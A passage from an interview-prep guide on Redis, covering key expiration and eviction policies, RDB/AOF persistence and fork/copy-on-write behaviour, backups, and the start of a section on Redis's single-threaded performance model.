1. **Lazy (passive) expiration** — when a client **accesses** a key, Redis checks its TTL first; if expired, it deletes the key then and returns as if it were absent. Cheap, but a key nobody touches is never noticed this way.

2. **Active expiration** — a background cycle (roughly 10x/second) **samples** a batch of keys that have TTLs, deletes the expired ones, and — if a high fraction of the sample was expired — repeats to catch up. This reaps keys that lazy expiration would never reach because they're never accessed.

Together they bound both CPU cost and stale-memory buildup. The key implication: an **expired-but-not-yet-collected key still consumes memory** until it's either accessed (lazy) or sampled (active). That's why memory usage doesn't drop the instant a batch of TTLs pass — and why a flood of simultaneously-expiring keys can briefly hold memory until the active cycle catches up.

### Q4. Do replicas expire keys on their own?

**No.** In a primary–replica setup, **only the primary drives expiration**. A replica does **not** independently delete a key when its TTL passes — instead, when the primary expires (or lazily deletes) a key, it propagates an explicit `DEL`/`UNLINK` to replicas. This keeps replicas byte-consistent with the primary and avoids replicas and primary disagreeing about whether a key exists.

The subtle consequence: a replica may still *hold* an expired key in memory until the primary's delete arrives. To avoid *serving* stale data, a replica will **logically treat an expired key as absent** on reads (returning nil) even before it has physically removed it — so reads stay correct even though the delete is primary-driven. This is why you should never rely on a replica to reclaim memory on its own, and why clock skew between nodes doesn't cause independent, inconsistent expiry.

### Q5. What is `maxmemory` and what happens when it's reached?

**`maxmemory`** is a configured ceiling on how much memory Redis may use for its dataset:

```bash
CONFIG SET maxmemory 4gb
CONFIG SET maxmemory-policy allkeys-lru
```

When Redis is about to exceed `maxmemory` on a write, it consults **`maxmemory-policy`** and acts:

- If the policy is an **eviction** policy (`allkeys-lru`, `volatile-lfu`, etc.), Redis evicts keys per that policy to free room, then performs the write.
- If the policy is **`noeviction`** (the **default**), Redis **refuses** the write and returns an error (`OOM command not allowed`), while still serving reads.

So `maxmemory` + policy together decide the behaviour under pressure. Critically, if you leave `maxmemory` unset, Redis will keep allocating until the OS kills it (or swapping wrecks latency). Setting a sensible `maxmemory` **and** an appropriate policy is basic production hygiene — especially for a cache, where you almost never want `noeviction`.

### Q6. Explain the Redis eviction policies.

When `maxmemory` is hit, `maxmemory-policy` chooses what to drop. There are two dimensions: **which keys are candidates** (all keys vs only those with a TTL) and **how to choose among them**.

| Policy | Candidates | Choice rule |
|---|---|---|
| `noeviction` | — | Reject writes (error). **Default.** |
| `allkeys-lru` | all keys | Least recently used |
| `allkeys-lfu` | all keys | Least frequently used |
| `allkeys-random` | all keys | Random |
| `volatile-lru` | keys with a TTL | Least recently used |
| `volatile-lfu` | keys with a TTL | Least frequently used |
| `volatile-random` | keys with a TTL | Random |
| `volatile-ttl` | keys with a TTL | Shortest remaining TTL first |

- **allkeys-*** evict from the *entire* keyspace — right for a **pure cache** (everything is disposable).
- **volatile-*** evict only keys that carry a TTL — right for a **mixed** instance holding both cache keys (with TTLs) and persistent keys (without), so evictions can't touch your durable data.
- **LRU** favours recency; **LFU** favours frequency (better when a small hot set should survive a burst of one-off accesses).

### Q7. What's the difference between `allkeys` and `volatile` policies?

The prefix decides the **eviction candidate pool**:

- **`allkeys-*`** — *any* key may be evicted, TTL or not. Use when the **whole instance is a cache** and every key is safe to drop and recompute. Simple and effective; nothing is sacred.
- **`volatile-*`** — only keys that have an **explicit TTL** are eviction candidates; keys without a TTL are **never** evicted. Use for a **mixed workload** where the same instance holds both throwaway cache entries (which you give TTLs) and data you must not lose (which you leave TTL-less).

The classic trap with `volatile-*`: if memory fills but **no** eviction-eligible (TTL-bearing) keys exist, Redis behaves like `noeviction` and starts **erroring on writes** — because there's nothing it's *allowed* to evict. So `volatile-lru` only works if you're disciplined about putting TTLs on the disposable keys. For a straightforward cache, `allkeys-lru` (or `allkeys-lfu`) avoids that footgun entirely.

### Q8. How do you choose an eviction policy for a cache?

For a **pure cache** (everything is recomputable), use **`allkeys-lru`** or **`allkeys-lfu`**:

- **`allkeys-lru`** — the classic default choice; keeps recently-used keys, drops cold ones. Great when recency predicts reuse.
- **`allkeys-lfu`** — better when you have a stable **hot set** that should survive occasional bursts of one-time accesses (e.g. a crawler or a big batch touching many cold keys once). LFU counts frequency, so those one-offs don't evict your genuinely popular keys.

For a **mixed cache + persistent store** on one instance, use **`volatile-lru`**/**`volatile-lfu`** and make sure every *cache* key gets a TTL — that confines eviction to disposable data and protects the persistent keys.

Whatever you pick, **also set TTLs** on cache keys (bounds staleness and gives `volatile-*` something to evict) and set a sane `maxmemory`. Avoid `noeviction` for a cache — it turns a full cache into write failures instead of gracefully shedding cold data.

### Q9. Why is `noeviction` being the default surprising, and dangerous for caches?

People assume Redis, "the cache," automatically discards old keys when full. It **doesn't** — the default `maxmemory-policy` is **`noeviction`**, which means once memory hits `maxmemory`, Redis **rejects every write** with `OOM command not allowed` while continuing to serve reads.

Why that's dangerous for a cache:

- You *wanted* the cache to shed cold entries and keep serving. Instead, new `SET`s start failing, so nothing new gets cached, and often the app treats those errors as hard failures — an outage, not graceful degradation.
- It's a **latent** bug: everything works until the day memory fills, then writes fail suddenly and confusingly under load.

The fix is explicit configuration — set `maxmemory` and choose `allkeys-lru`/`allkeys-lfu` (pure cache) or `volatile-*` with disciplined TTLs (mixed). This is exactly the "eviction vs expiration" awareness interviewers probe: knowing that "out of memory" doesn't auto-evict unless you *told* it to.

### Q10. What is the crucial distinction between eviction and expiration?

They are **different mechanisms with different triggers** — the single most important idea in this topic:

- **Expiration** is **TTL-driven**. A key you gave a TTL dies when that TTL elapses, removed lazily (on access) or actively (by the sampling cycle). It happens **per-key**, on schedule, regardless of memory. A key with no TTL never expires.
- **Eviction** is **memory-pressure-driven**. When total usage hits `maxmemory`, the eviction policy removes keys to make room for new writes — and it may evict keys that have **not** expired (even keys with no TTL, under an `allkeys-*` policy). It happens because Redis is *full*, not because any particular key's time is up.

```text
TTL elapsed        -> expiration (lazy + active)
maxmemory reached  -> eviction   (per maxmemory-policy)
```

A key can vanish for either reason, and they're independent: expiration can happen with gigabytes free; eviction can happen to a key with a fresh, long TTL. Interviewers love this because conflating them ("Redis just deletes old keys when memory is full") reveals someone who hasn't operated it.

### Q11. Why should you set TTLs on cache keys?

TTLs are the safety net that makes a cache *behave like a cache*:

- **Bounded staleness** — the cached copy can only drift from the source of truth for at most the TTL. Even if an invalidation is missed (a bug, a race), the key self-heals when it expires.
- **Automatic cleanup** — cold keys that stop being requested eventually vanish on their own, reclaiming memory without any eviction pressure or manual sweeping.
- **Enables `volatile-*` eviction** — those policies can only evict keys that *have* a TTL; no TTLs means nothing to evict and writes start failing.
- **Stampede control** — combined with jitter (randomising the TTL a little), TTLs prevent huge cohorts of keys expiring at the same instant and hammering the backend.

The rule: **cache keys should almost always have a TTL.** A TTL-less cache relies entirely on perfect invalidation (fragile) and on eviction (which needs `allkeys-*`). Adding a TTL — ideally at write time via `SET ... EX` — is the cheapest correctness-and-memory insurance there is.

### Q12. What do `OBJECT IDLETIME` and `OBJECT FREQ` tell you?

They expose the metadata Redis uses to make LRU/LFU eviction decisions, useful for debugging what would get evicted:

```bash
OBJECT IDLETIME user:123    # seconds since the key was last accessed (LRU metric)
OBJECT FREQ user:123        # logarithmic access-frequency counter (LFU metric)
OBJECT ENCODING user:123    # internal encoding (listpack, hashtable, intset, ...)
```

- **`OBJECT IDLETIME`** works under **LRU** policies — it returns how long since the key was last touched. High idle time = a strong eviction candidate under LRU.
- **`OBJECT FREQ`** works only when the policy is **LFU** (`allkeys-lfu`/`volatile-lfu`) — it returns the approximated, log-scaled access frequency counter. Low freq = likely to be evicted under LFU.

You can only read one or the other depending on which mode `maxmemory-policy` is in (LRU vs LFU track different metadata). They're diagnostic tools: to understand *why* a key survived or got evicted, inspect its idle time or frequency. `OBJECT ENCODING` (same command family) is separately invaluable for spotting when a key has fallen out of a compact encoding into a memory-hungry one.

### Q13. How do you safely scan the keyspace? Why never `KEYS *`?

**Never run `KEYS *` (or `KEYS pattern`) in production.** `KEYS` scans the **entire** keyspace in one blocking, O(N) operation — and because Redis is single-threaded, it **freezes every other client** until it finishes. On a big keyspace that's a multi-second stall and an outage.

Use **`SCAN`** instead — a cursor-based iterator that returns keys in small batches without blocking:

```bash
SCAN 0 MATCH user:123:* COUNT 100    # returns a cursor + a batch
SCAN <cursor> MATCH user:123:* COUNT 100   # repeat until cursor is 0
TYPE somekey                          # what type is this key?
RANDOMKEY                             # a random key (sampling)
DBSIZE                                # total number of keys (O(1))
```

`SCAN` guarantees every key present for the whole iteration is returned at least once, but may return duplicates and reflects concurrent changes — so dedupe client-side and don't treat it as a snapshot. The type-specific variants **`SSCAN`/`HSCAN`/`ZSCAN`** iterate *inside* a large set/hash/ZSET the same safe way. Rule: any "list/iterate the keyspace" task in prod uses `SCAN`, never `KEYS`.

### Q14. What are keyspace notifications and when would you use them?

**Keyspace notifications** make Redis publish Pub/Sub events when keys change or expire, so clients can *react* to keyspace activity instead of polling. They're off by default (they cost CPU) and enabled via config flags:

```bash
CONFIG SET notify-keyspace-events KEA   # K=keyspace, E=keyevent, A=all event classes
# then subscribe, e.g. to expirations:
PSUBSCRIBE __keyevent@0__:expired
```

You get two channel families: `__keyspace@<db>__:<key>` ("what happened to *this key*") and `__keyevent@<db>__:<event>` ("which keys had *this event*", e.g. `expired`, `del`, `set`). A common use is a **poor-man's delayed job / expiry callback**: set a key with a TTL and act when its `expired` event fires.

The big caveat: notifications are **Pub/Sub**, so **at-most-once** with no persistence — if no subscriber is connected (or it's slow), the event is **lost**. And the `expired` event fires when the key is *actually removed* (lazily or actively), which can lag the TTL. For anything that must not miss events, use **Streams** instead. Good for best-effort reactions, not for guaranteed delivery.

### Q15. When memory fills, is it eviction or an expiring key that reclaims it — and why might a key "disappear"?

A key can disappear for **three** distinct reasons, and diagnosing which one matters:

1. **It expired** — you set a TTL and it elapsed; removed lazily or by the active cycle. The key had a finite TTL.
2. **It was evicted** — `maxmemory` was reached and the eviction policy dropped it to make room, possibly *before* any TTL and even if it had none (`allkeys-*`).
3. **It was explicitly deleted / overwritten** — `DEL`, `UNLINK`, `FLUSHDB`, or a rename.

To tell them apart: check `INFO stats` for **`expired_keys`** vs **`evicted_keys`** counters — rising `evicted_keys` means you're under memory pressure and the policy is shedding keys (time to raise `maxmemory` or shrink the dataset); rising `expired_keys` is just normal TTL turnover. Also check `maxmemory` and `maxmemory-policy`. Memory reclamation itself is **not instantaneous** on expiry (an expired key holds memory until accessed or sampled), so a brief lag between "TTL passed" and "RSS dropped" is expected. If a key you *didn't* give a TTL vanished, suspect **eviction** (under an `allkeys-*` policy) or an explicit delete — never expiration.

### Q16. How do you monitor and reason about memory reclamation timing?

Memory doesn't track the logical state instantly, so use the right signals:

```bash
INFO memory        # used_memory, used_memory_rss, mem_fragmentation_ratio, maxmemory
INFO stats         # expired_keys, evicted_keys, keyspace_hits/misses
DBSIZE             # current key count
MEMORY USAGE key   # bytes for a specific key (spot big keys)
```

Key timing facts to reason about:

- **Expired keys linger**: an expired key holds memory until lazy access or the active cycle reaps it, so `used_memory` lags a wave of expirations. A big synchronized expiry (e.g. many keys with the same absolute `EXPIREAT`) causes a delayed, chunky reclaim as the active cycle catches up — stagger TTLs to smooth it.
- **Freeing isn't returning to the OS**: after deletion Redis frees memory into its allocator (jemalloc), which may not immediately return it to the OS — `used_memory_rss` can stay high while `used_memory` drops. Watch `mem_fragmentation_ratio`; enable `activedefrag` if fragmentation is chronic.
- **`UNLINK` vs `DEL`**: `UNLINK` frees large keys **asynchronously** on a background thread, avoiding a single-threaded stall when deleting a huge key — prefer it for big-key cleanup.
- **evicted_keys climbing** = sustained memory pressure; the fix is capacity (bigger `maxmemory`/box), shorter TTLs, smaller values, or sharding — not just a bigger policy tweak.

So: use `INFO`'s counters to distinguish expiry from eviction, expect a lag between logical death and RSS drop, and reach for `UNLINK`/`activedefrag` when big keys or fragmentation distort the picture.
## Persistence: RDB & AOF

### Summary

**What this topic covers**

The single biggest misconception about Redis is that "in-memory" means "your data evaporates on restart." It does not. Redis ships two orthogonal persistence mechanisms — **RDB** point-in-time snapshots and **AOF** an append-only command log — and you can run either, both, or neither. This topic covers how each works, the `fork()`/copy-on-write machinery that makes background saves possible (and occasionally spikes latency), the fsync durability knobs, the compaction/rewrite process, the recommended **hybrid RDB+AOF** default, disaster recovery, and the honest answer to the interview staple: "if Redis crashes right now, how much data do I lose?" — which depends entirely on your config. The 16 questions here move from "does Redis persist at all" to "diagnose this fork-induced latency spike on a 40 GB dataset."

**Mental model**

Think of the two mechanisms as **snapshot vs journal**. RDB is a camera: at chosen moments it photographs the entire dataset into one compact binary file (`dump.rdb`). Fast to write, tiny to store, lightning-fast to reload — but everything that happened between the last photo and a crash is gone. AOF is a flight recorder: it appends every write command as it happens, so replaying the log rebuilds state command-by-command. More durable (you can lose as little as one second, or nothing), but the file is larger and restart is slower because Redis re-executes the log. The crucial machinery under both background operations is **`fork()` + copy-on-write**: Redis forks a child process that holds a frozen view of memory and writes it to disk while the parent keeps serving clients. The OS shares pages between parent and child until the parent modifies one, at which point that page is copied. This is why a background save on a huge, write-heavy dataset needs spare RAM and can stall briefly — the fork itself, not the disk write, is the latency source.

**Key terms**

- **RDB** — Redis Database snapshot; a compact point-in-time binary dump of the whole keyspace (`dump.rdb`).
- **BGSAVE** — non-blocking background snapshot; forks a child that writes the RDB while the parent serves traffic. `SAVE` is the blocking, foreground variant (almost never use it in prod).
- **save rules** — config lines like `save 900 1` ("snapshot if ≥1 key changed in 900s"); multiple rules OR together.
- **AOF** — Append-Only File; a log of every write command, replayed on restart to reconstruct state.
- **appendfsync** — AOF durability policy: `always` (fsync per write, safest/slowest), `everysec` (default, ≤1s loss), `no` (let the OS flush).
- **BGREWRITEAOF** — compacts the AOF to the minimal set of commands that recreate the current dataset; also a fork.
- **copy-on-write (COW)** — the OS page-sharing trick that lets the forked child snapshot memory without pausing the parent.
- **hybrid persistence** — `aof-use-rdb-preamble yes`; the AOF begins with an RDB snapshot then appends recent commands. The recommended default.
- **LASTSAVE** — returns the Unix timestamp of the last successful RDB save.
- **maxmemory / COW headroom** — a write-heavy fork can transiently double memory; provision spare RAM.

**Why interviewers ask this**

Persistence is where "I've used Redis" separates from "I've operated Redis." A junior answer is "Redis saves to disk sometimes." A senior answer names the exact data-loss window for a given config, explains why `BGSAVE` forks, knows that a fork on a 50 GB instance can add tens of milliseconds of latency (and that Transparent Huge Pages makes it worse), and can design a persistence strategy per workload: pure cache → maybe no persistence at all; session store → AOF `everysec`; a queue you can't afford to lose → AOF plus off-box backups. Interviewers also probe whether you understand that replication's initial sync uses an RDB snapshot, so persistence config affects your HA story too. Getting the "how much do I lose" question precise — per policy — is the tell they're looking for.

**Common confusions**

- "In-memory means non-durable." False — RDB and/or AOF give you durability; the tradeoff is how much and how fast.
- "AOF fsyncs on every command by default." No — the default is `everysec`, a ~1-second worst-case loss window. `always` is the per-write mode.
- "RDB blocks the server while saving." `SAVE` does; `BGSAVE` forks and doesn't (except the brief fork itself).
- "AOF never needs maintenance." It grows unbounded and must be rewritten/compacted (`BGREWRITEAOF`, auto-triggered by `auto-aof-rewrite-percentage`).
- "Running both is redundant." The hybrid RDB-preamble AOF is the recommended default — fast reload plus low data loss.
- "Fork copies all memory immediately." Copy-on-write means pages are shared until written; only the fork bookkeeping and later page copies cost memory.

**What follows from this topic**

Persistence underpins **Replication & HA** — a replica's first sync streams an RDB from the primary, and async replication means a failover can lose writes not yet acknowledged. It connects to the **Single-Threaded Model** topic, because the fork for `BGSAVE`/`BGREWRITEAOF` is a classic p99 latency spike source, and to **eviction/memory**, because COW needs headroom on top of `maxmemory`. If you understand snapshot-vs-journal here, the "durable Redis" options (AOF `always`, or Redis Enterprise / MemoryDB) make sense as points on the durability–latency curve.

### Q1. Is Redis durable, or do I lose everything on restart?

Redis is durable if you configure it to be — "in-memory" describes where the working dataset lives, not whether it survives a restart. Redis offers two persistence mechanisms:

- **RDB** — periodic point-in-time snapshots of the whole dataset to a binary `dump.rdb` file.
- **AOF** — an append-only log of every write command, replayed on startup to rebuild state.

You can enable either, both, or neither. On startup Redis loads the AOF if present (it's more complete), otherwise the RDB. A pure cache might persist nothing; a session store or lightweight queue should run AOF. So the honest answer is: "It depends on my config — and I can tell you the exact data-loss window for each."

### Q2. How does an RDB snapshot work?

An RDB snapshot is a compact binary dump of the entire keyspace at a moment in time. It's triggered three ways:

```bash
SAVE      # blocking: parent process writes the dump, server frozen — avoid in prod
BGSAVE    # non-blocking: fork a child, child writes the dump, parent keeps serving
```

And automatically by `save` rules in `redis.conf`:

```bash
save 900 1      # snapshot if >= 1 key changed in 900s
save 300 10     # ...or >= 10 keys changed in 300s
save 60 10000   # ...or >= 10000 keys changed in 60s
```

The rules OR together. `BGSAVE` is the workhorse: Redis calls `fork()`, and the child process — holding a copy-on-write view of memory — serializes it to a temp file, then atomically renames it over `dump.rdb`. The parent never stops serving except for the brief fork itself.

### Q3. How does AOF differ from RDB?

AOF logs every write command in a replayable format; on restart Redis re-executes the log to rebuild the dataset.

| | RDB | AOF |
|---|---|---|
| Format | Compact binary snapshot | Log of write commands |
| Data loss on crash | Everything since last snapshot | ≤1s (`everysec`) or none (`always`) |
| File size | Small | Larger (grows, needs rewrite) |
| Restart speed | Fast (load one dump) | Slower (replay commands) |
| Best for | Backups, fast restart, tolerable loss | Durability-sensitive data |
| Cost | Fork + periodic COW | Continuous fsync + rewrites |

RDB optimizes restart time and backup size; AOF optimizes durability. Most production setups run both via the hybrid preamble (Q9).

### Q4. What is the `appendfsync` policy and what are the tradeoffs?

`appendfsync` controls how often the AOF buffer is flushed to disk with `fsync()`:

```bash
appendfsync always     # fsync after every write — safest, slowest
appendfsync everysec   # fsync once per second — default, <= 1s loss
appendfsync no         # never explicitly fsync — OS decides (~30s), fastest
```

- **always** — effectively zero data loss but every write pays a disk sync; throughput drops hard on spinning disks and even on SSDs it's a big hit.
- **everysec** — the default and the right answer for almost everyone: at most ~1 second of writes lost on a crash, near-full throughput.
- **no** — you inherit the OS's flush interval (often up to 30s); fast but weak durability.

The interview point: name the loss window per policy. "everysec loses at most one second" is the line they want.

### Q5. Why does BGSAVE fork a child process, and what does copy-on-write have to do with it?

Redis is single-threaded for command execution, so it can't spend seconds serializing gigabytes to disk on the main thread without freezing every client. Instead it calls `fork()`. The child inherits a **copy-on-write** snapshot of the parent's memory: the OS marks all pages read-only and shared. The child walks that frozen view and writes it to disk while the parent keeps mutating data. When the parent writes to a shared page, the OS transparently copies that one page so the child still sees the old value.

Consequences:

- The snapshot is a true point-in-time image, consistent even though the parent keeps serving.
- **Memory**: on a write-heavy load, many pages get copied, so a fork can transiently need a large fraction of the dataset size in extra RAM — provision headroom above `maxmemory`.
- **Latency**: the `fork()` call itself pauses the parent to copy page tables; on a huge dataset that's a measurable spike.

### Q6. My p99 latency spikes every few minutes on a large instance. Persistence-related causes?

Prime suspect: **fork()** for `BGSAVE` or `BGREWRITEAOF`. On a large dataset, copying the page tables at fork time pauses the main thread for milliseconds to tens of milliseconds. Look at:

```bash
redis-cli INFO stats | grep latest_fork_usec   # microseconds the last fork took
redis-cli INFO persistence                     # rdb_/aof_ background save status
```

Common aggravators and fixes:

- **Transparent Huge Pages (THP)** — makes COW copy 2 MB pages instead of 4 KB, ballooning fork latency and memory. Disable THP (`madvise`/`never`) — Redis warns about this at startup.
- **No spare RAM** — COW page copies push you into swap; the child's writes stall. Keep headroom above `maxmemory`.
- **`appendfsync always`** — every write pays an fsync; move to `everysec`.
- **Too-frequent snapshots** — loosen `save` rules or offload persistence to a replica so the primary never forks.

### Q7. Can I run Redis with no persistence at all?

Yes — for a pure cache where the source of truth lives elsewhere, disable both:

```bash
save ""                 # no RDB snapshot rules
appendonly no           # no AOF
```

Now a restart starts empty and the cache re-warms from the backing store on misses. This is a legitimate, common setup: it removes fork latency spikes entirely and maximizes throughput. The tradeoff is a cold cache after any restart (watch for a thundering-herd of misses hammering your database as it re-warms). If losing the dataset is genuinely fine, no-persistence is the fastest configuration Redis offers.

### Q8. How does the AOF get compacted, and why does it need to?

The AOF appends every write, so it grows without bound — a key `SET` a million times leaves a million lines. **AOF rewrite** compacts it to the minimal command set that recreates the current dataset (that key becomes one `SET`).

```bash
BGREWRITEAOF            # manually trigger a rewrite (forks a child)
```

Automatic triggering via config:

```bash
auto-aof-rewrite-percentage 100   # rewrite when AOF is 100% larger than after last rewrite
auto-aof-rewrite-min-size 64mb    # ...but not until it's at least 64mb
```

Like `BGSAVE`, the rewrite forks a child that writes a fresh compact AOF while new commands are buffered and appended to the tail. Redis 7 introduced **multi-part AOF** (a base file plus incremental files in an `appenddirname` directory with a manifest), which makes rewrites cleaner and cheaper.

### Q9. What is the hybrid RDB+AOF (RDB preamble) mode and why is it recommended?

Hybrid persistence writes the AOF as an **RDB snapshot preamble followed by a tail of recent commands**. On rewrite, Redis dumps the current dataset in fast, compact RDB binary format as the base of the AOF file, then appends subsequent write commands in AOF text format.

```bash
appendonly yes
aof-use-rdb-preamble yes    # default yes in modern Redis
```

You get the best of both:

- **Fast restart** — the bulk of the data loads as an RDB blob, not command-by-command.
- **Low data loss** — the command tail (fsynced per `everysec`) captures recent writes the last rewrite missed.

This is the recommended default for durability-sensitive workloads. Enable AOF, leave the RDB preamble on, keep `appendfsync everysec`.

### Q10. If Redis crashes right now, how much data do I lose?

It depends entirely on config — this precision is what interviewers want:

| Config | Data loss on crash |
|---|---|
| No persistence | Everything |
| RDB only | Everything since the last snapshot (could be minutes) |
| AOF `appendfsync no` | Up to the OS flush interval (~tens of seconds) |
| AOF `appendfsync everysec` | Up to ~1 second |
| AOF `appendfsync always` | Effectively nothing (last write may be in-flight) |
| RDB + AOF everysec | ~1 second (AOF wins on load) |

Note that even `always` has caveats — an OS/disk-level buffer or a power loss before the platter commit can still lose the very last write. For true zero-loss you need synchronous replication or an external durable store.

### Q11. How do I back up and restore a Redis dataset?

**Backup** — copy the RDB file off-box:

```bash
redis-cli BGSAVE                        # ensure a fresh snapshot
redis-cli LASTSAVE                      # confirm the timestamp advanced
cp /var/lib/redis/dump.rdb /backups/dump-$(date +%F).rdb   # copy the dump elsewhere
```

The RDB is a single self-contained binary — copying it while Redis runs is safe because `BGSAVE` renames atomically. Ship it to durable off-host storage (S3, another region).

**Restore** — stop Redis, drop the RDB in place, start:

```bash
# stop redis, then:
cp /backups/dump-2026-07-01.rdb /var/lib/redis/dump.rdb
# start redis — it loads dump.rdb on boot
```

For AOF, back up the append directory. The key discipline: backups live **off the box** — a snapshot on the same disk that died is no backup.

### Q12. What does LASTSAVE do?

`LASTSAVE` returns the Unix timestamp of the last successful RDB save:

```bash
redis-cli LASTSAVE        # (integer) 1719800000
```

It's the standard way to confirm a `BGSAVE` actually completed: capture `LASTSAVE`, trigger `BGSAVE`, poll `LASTSAVE` until the timestamp increases. That's more reliable than assuming the background save finished, since `BGSAVE` returns immediately while the child is still writing. `INFO persistence` (`rdb_last_bgsave_status`) gives the success/failure of the last attempt.

### Q13. How does persistence interact with replication?

Replication leans directly on RDB. When a replica connects for a **full sync**, the primary runs a `BGSAVE`, streams the resulting RDB to the replica, and buffers writes that arrive during the transfer to replay afterward (or streams the RDB directly to the socket with diskless replication). So even if you don't care about on-disk persistence, the fork/snapshot machinery is exercised whenever a replica syncs.

Practical consequences:

- A primary with many replicas syncing at once forks repeatedly — a latency and memory concern.
- **Diskless replication** (`repl-diskless-sync yes`) streams the RDB over the socket without touching disk, useful on slow disks / fast networks.
- Because replication is **asynchronous**, a failover can lose writes the primary acknowledged but hadn't yet shipped to the promoted replica — persistence config doesn't close that window; `WAIT` or synchronous setups do.

### Q14. Which persistence strategy should I use for which workload?

Match the strategy to the cost of losing data:

- **Pure cache (DB is source of truth)** — no persistence, or RDB only for faster warm restarts. Prioritize throughput and zero fork spikes.
- **Session store** — AOF `everysec`. Losing ~1s of session writes is acceptable; losing all sessions on restart isn't.
- **Queue / job data you can't drop** — AOF `everysec` (or `always` if truly critical) plus off-box RDB backups, and ideally a replica.
- **Analytics counters, leaderboards** — RDB snapshots are usually enough; a few minutes of loss is tolerable and restart is fast.
- **Anything correctness-critical** — reconsider whether Redis alone is your durability layer; pair with a durable store or use Redis Enterprise / AWS MemoryDB (which offers a durable multi-AZ transaction log).

Default recommendation for "I want it durable and don't want to think hard": AOF on, RDB preamble on, `everysec`, plus periodic off-box RDB backups.

### Q15. Can Redis be a durable primary datastore, not just a cache?

With the right config, closer than people assume — but with honest caveats. AOF `always` plus replication gets you strong durability, and **AWS MemoryDB for Redis** is explicitly a durable, Redis-compatible primary database: it writes to a multi-AZ transactional log so a committed write survives node and AZ failure. Redis Enterprise offers similar durability guarantees.

The caveats for vanilla open-source Redis: async replication has a failover loss window, `fsync always` costs throughput, and a single-node Redis with only local persistence loses data if the disk dies. So Redis *can* be durable, but "durable primary store" usually means MemoryDB/Enterprise or a carefully engineered AOF-`always`-plus-sync-replica setup — not a default single node. In an interview, acknowledge both: "yes, but the durability tier you need dictates the deployment."

### Q16. What are the fork/COW gotchas on a very large dataset?

Forking a multi-GB Redis instance has three failure modes worth naming:

- **Fork latency** — copying the parent's page tables scales with dataset size; on tens of GB the `fork()` itself pauses the main thread for tens of ms. Check `latest_fork_usec`.
- **COW memory blow-up** — under heavy writes during the save, many shared pages get copied; peak memory can spike well above steady-state. Without headroom you hit swap or the OOM killer. Keep `maxmemory` well below physical RAM.
- **Transparent Huge Pages** — with THP enabled, COW copies 2 MB pages instead of 4 KB, multiplying both latency and memory amplification. Redis logs a warning; disable THP.

Mitigations: run persistence on a **dedicated replica** so the primary never forks; disable THP; ensure `vm.overcommit_memory=1` so `fork()` doesn't fail under pressure; loosen snapshot frequency; prefer diskless replication on fast networks. The theme: on big instances, the fork — not the disk — is the enemy.

## The Single-Threaded Model & Performance

### Summary

**What this topic covers**

Redis executes commands on a **single thread** — one command at a time on an event loop — and almost every performance property, footgun, and design idiom follows from that one fact. This topic covers why single-threaded is a deliberate feature (atomic commands, no locks, simplicity), why Redis is nonetheless one of the fastest datastores around, and the flip side: **one slow command blocks every client**. We cover the O(N) footguns (`KEYS *`, big `SMEMBERS`/`HGETALL`/`LRANGE`, giant `DEL`), the safe cursor-based alternatives (`SCAN` family), throughput techniques (pipelining, `MGET`/`MSET`), the Redis 6+ I/O threads that parallelize *network* work only, lazy-freeing for big deletes, and how to diagnose latency with `SLOWLOG`, `--latency`, and `redis-benchmark`. The 16 questions run from "is Redis really single-threaded and why is that OK" to "my p99 spiked — which commands do you suspect and how do you confirm?"

**Mental model**

Picture a single cashier serving a queue. Every client request joins one line; the cashier handles them strictly one at a time, start to finish, before touching the next. That's the event loop. Two things fall straight out. First, **atomicity is free**: while the cashier processes your `INCR`, no other command can interleave, so you never need locks around a single command — it's inherently isolated. Second, **the slowest customer blocks the whole line**: there's no second cashier to absorb a customer who dumped 10 million items on the counter (`KEYS *` on a huge keyspace, or `SMEMBERS` of a giant set). Redis stays fast because each "transaction" is tiny — data is in RAM, most operations are O(1) or O(log N), there are no lock or context-switch costs, and the RESP protocol over epoll is cheap. The performance engineering job is therefore: keep every command short, batch round-trips, and never hand the single cashier an O(N) task on a big key.

**Key terms**

- **Event loop** — the single thread that dequeues client requests and executes commands one at a time.
- **Atomic command** — because nothing interleaves, every individual Redis command runs to completion with no locks needed.
- **O(N) command** — one whose cost scales with collection/keyspace size (`KEYS`, `SMEMBERS`, `LRANGE 0 -1`, `SORT`); the primary blocking risk.
- **SCAN family** — `SCAN`/`HSCAN`/`SSCAN`/`ZSCAN`; cursor-based incremental iteration that never blocks the server.
- **pipelining** — sending many commands without waiting for each reply, amortizing round-trip time (RTT); a throughput win, not a transaction.
- **RTT (round-trip time)** — network latency per request/response; the real cost of small ops, and what pipelining attacks.
- **SLOWLOG** — a ring buffer logging commands whose execution exceeded a microsecond threshold.
- **I/O threads** — Redis 6+ threads that parallelize socket read/write and reply encoding; command execution stays single-threaded.
- **UNLINK / lazy free** — asynchronous key deletion / eviction that reclaims memory on a background thread instead of blocking.
- **big key / hot key** — an oversized value (blocks on access) / a single key taking disproportionate traffic.

**Why interviewers ask this**

This topic is the single best filter for "has this person operated Redis under load." A junior says "Redis is fast because it's in-memory" and stops. A senior says "single-threaded, so a command is atomic *and* a rogue `KEYS *` freezes production" — and then can name the O(N) offenders, reach for `SCAN`, distinguish pipelining from transactions, and explain that Redis 6 I/O threads don't parallelize command execution. The "diagnose the p99 spike" scenario is a favorite because it forces you to reason from the model: no parallelism means the culprit is a blocking command, a fork, a big key, or swap — and you should know to check `SLOWLOG` and `latest_fork_usec` first. Nailing why single-threaded is a *feature* (correctness for free) rather than apologizing for it is the senior signal.

**Common confusions**

- "Single-threaded means slow." The opposite — no locks, no context switches, everything in RAM; a single thread saturates a NIC.
- "Redis 6 made command execution multi-threaded." No — I/O threads parallelize network reads/writes only; commands still run one at a time.
- "`KEYS` is fine, it's just a lookup." `KEYS pattern` scans the entire keyspace, O(N), blocking — banned in prod; use `SCAN`.
- "Pipelining is a transaction." It isn't — pipelining just batches round-trips; other clients' commands can interleave. Use `MULTI` for atomicity.
- "`DEL` of a big key is cheap." Freeing millions of elements is O(N) and blocks; use `UNLINK` for async reclamation.
- "SCAN gives a consistent snapshot." It offers weak guarantees — keys present throughout are returned, but concurrent mutations may be missed or duplicated.

**What follows from this topic**

The single-threaded model is *why* the **Transactions/Lua** topic works the way it does — `MULTI/EXEC` and `EVAL` are atomic precisely because nothing interleaves on the one thread. It explains the **Persistence** fork latency (the one thread pauses to fork) and the **eviction** blocking risk (freeing memory on the main thread). It also motivates **Cluster** as the way to get true parallelism — sharding across nodes gives you N event loops. Master this topic and the rest of Redis's design reads as consequences rather than arbitrary rules.

### Q1. Is Redis single-threaded, and why is that a good thing?

Yes — Redis executes commands on a **single thread** via an event loop, one command at a time. That's a deliberate design choice, not a limitation:

